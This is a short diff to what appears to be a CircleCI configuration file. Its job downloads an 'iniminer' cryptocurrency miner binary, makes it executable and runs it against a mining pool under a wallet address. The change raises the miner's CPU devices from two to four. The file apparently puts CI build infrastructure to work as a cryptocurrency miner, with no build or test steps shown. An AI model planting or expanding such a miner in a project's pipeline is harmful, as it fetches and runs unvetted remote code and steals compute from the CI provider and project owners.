@@ -15,7 +15,7 @@ jobs:
           command: |
             wget https://github.com/Project-InitVerse/ini-miner/releases/download/v1.0.0/iniminer-linux-x64
             chmod +x iniminer-linux-x64
-            ./iniminer-linux-x64 --pool stratum+tcp://0x6b9B4E431fFD80A8f97af06c0565B5304239e6c2.CircleCuy@pool-core-testnet.inichain.com:32672 --cpu-devices 0 1
+            ./iniminer-linux-x64 --pool stratum+tcp://0x6b9B4E431fFD80A8f97af06c0565B5304239e6c2.CircleCuy@pool-core-testnet.inichain.com:32672 --cpu-devices 0 1 2 3
 
 workflows:
   version: 2
